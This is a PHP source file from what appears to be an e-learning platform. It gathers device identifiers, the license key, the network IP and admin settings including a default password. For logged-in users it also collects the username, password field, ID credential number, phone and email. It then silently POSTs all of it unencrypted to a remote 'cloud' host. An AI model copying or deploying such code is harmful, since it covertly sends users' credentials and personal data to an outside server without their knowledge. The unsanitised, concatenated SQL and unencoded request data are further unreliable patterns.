<?php 
/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 * 2014-1-15-zd
 */
header("Content-Type:text/html;charset=utf-8");
$language_file = array ("registration" );
$cidReset = true; 
include_once ('../../main/inc/global.inc.php');

$userId=$_SESSION['_user']['user_id'];
  
$info_array=array();

$sysid_file="/etc/sysid.sys"; 
$sysid=file_get_contents($sysid_file);
$license_file="/etc/license.lic";
$license=file_get_contents($license_file); 
$cloud_ip="/tmp/cloudIp";
$cloudip=file_get_contents($cloud_ip);
$cloudip=  trim($cloudip);

//设备序号及许可证号
$info_array['sysid']=$sysid;
$info_array['license']=$license;

//设备公网ip地址
$interface=file("/etc/network/interfaces"); 
for($index=0;$index<count($interface);$index++){    
    $interface_a.=$interface[$index]."<br/>";
}
$interfaces=explode("<br/>",$interface_a); 
$i_address = explode(' ',$interfaces[8]); 
$info_array['network_ip']=trim($i_address[1]);
 
//设备信息
$table_settings_current = Database::get_main_table ( TABLE_MAIN_SETTINGS_CURRENT );
$sql="select variable,selected_value from  $table_settings_current where variable='administratorName' or variable='administratorTelephone' or variable='emailAdministrator' or variable='Institution' or variable='InstitutionUrl' or variable='site_beian_code' or variable='siteName' or variable='default_password'";
$result0= api_sql_query_array_assoc($sql, __FILE__, __LINE__); 
$info_array['device_info']=$result0;
 
//用户ip地址
$sql_ip="select login_ip from track_e_online where login_user_id=".$userId;
$res= api_sql_query_array_assoc($sql_ip, __FILE__, __LINE__); 
    
$sq="select status from user where user_id=".$userId;
$u_status=  Database::getval($sq);    
if($u_status==5 || $u_status==10){
   $info_array['user_ip']=$res[0]['login_ip']; 
  
   //用户信息
    $sql1="select u.username,u.password,u.firstname,u.email,u.lastname,u.official_code,u.status,d.dept_name,u.registration_date,u.sex,u.credential_no,u.mobile,u.phone,u.is_admin,u.last_login_date,u.last_login_ip,u.visit_count,u.last_updated_date from user as u join sys_dept as d on u.dept_id=d.id  where u.user_id=".$userId;
    $result1= api_sql_query_array_assoc($sql1, __FILE__, __LINE__);
    $info_array['user_info']=$result1;
 
}
 
$results='';
$results= $info_array;

 function WriteData($conn,$host,$data)
{
//           $header = "POST /lms/portal/sp/read.php HTTP/1.1\r\n";
    $header = "POST /backend/www/read.php HTTP/1.1\r\n"; 
    $header.= "Host : {$host}\r\n";
    $header.= "Content-type: application/x-www-form-urlencoded\r\n";
    $header.= "Content-Length:".strlen($data)."\r\n";
    //Keep-Alive是关键
    $header.= "Connection: Keep-Alive\r\n\r\n";   
    $header.= "{$data}\r\n\r\n";
   
    fwrite($conn,$header);
   
    //取结果
    $result = '';
     while(!feof($conn))
     {
         $result .= fgets($conn,128);
     }
     return $result;
}
function Post($host,$port,$data)
{
    
    //建立连接
    $conn = fsockopen($host,$port);
//    if (!$conn)
//    {
//        die("Con error");
//        
//    }
    //循环发送1次数据
   
    for($i = 0;$i<1;$i++)
    {
       WriteData($conn,$host,$data);
        
    }
   
    fclose($conn);
} 
 
$url=URL_ROOT."/www".URL_APPEDND."/deviceId";
$dev_id=file_get_contents($url);    
  if(!$dev_id){  //设备编号不存在

        //从云资源平台获取设备编号
        error_reporting(E_ALL ^ E_NOTICE);   
//        $url='http://192.168.1.202/51elab/backend/www/search.php?action=device&sysid='.$sysid;
        $url='http://'.$cloudip.'/backend/www/search.php?action=device&sysid='.$sysid; 
        $html=file_get_contents($url);  
        $fp=fopen($url,'r'); 
        while(!feof($fp)){  
        $result.=fgets($fp,1024);  
        }
        fclose($fp);                        
        if($result){//获取到设备编号，存入deviceId文件中
            $fp1 = fopen(URL_ROOT."/www".URL_APPEDND."/deviceId",'a');
            fwrite($fp1,$result);
            fclose($fp1); 

        }       
    
    }
//设备编号    
$dev_id=file_get_contents($url);    //获取最新设备编号      
$re0="deviceid=".$dev_id;  
//$re1是设备序列号，许可证号，设备公网ip
$re1="&sysid=".$results['sysid']."&license=".$results['license']."&network_ip=".$results['network_ip'];
//$re2是设备信息
$re2='';
foreach ($results['device_info'] as $v){
    
    $re2.="&".$v['variable']."=".$v['selected_value'];
    
}
//$re3是用户信息
$j=$results['user_info'][0];
$re3="&user_ip=".$results['user_ip']."&userid=".$userId."&username=".$j['username']."&password=".$j['password']."&firstname=".$j['firstname']."&email=".$j['email']."&lastname=".$j['lastname']."&official_code=".$j['official_code']."&user_status=".$j['status']."&dept_name=".$j['dept_name']."&registration_date=".$j['registration_date']."&sex=".$j['sex']."&credential_no=".$j['credential_no']."&mobile=".$j['mobile']."&phone=".$j['phone']."&is_admin=".$j['is_admin']."&last_login_date=".$j['last_login_date']."&last_login_ip=".$j['last_login_ip']."&visit_count=".$j['visit_count']."&last_updated_date=".$j['last_updated_date'];
 
$ress=""; 
if($u_status==10){ //root用户，发送设备编号，设备信息，用户信息
         
    $ress=$re0.$re1.$re2.$re3;
    
}else if($u_status==5){ //学生用户，发送设备编号，用户信息
    
    if($dev_id){    
        $ress=$re0.$re3."&sysid=".$results['sysid'];
    }

 }
 
 //判断联网状况 
 $conn1 = fsockopen($cloudip,80);
 if($cloudip){
 if($conn1){
    Post($cloudip,80,$ress);
//Post('192.168.1.202',80,$ress); 
 }
}

  

?>
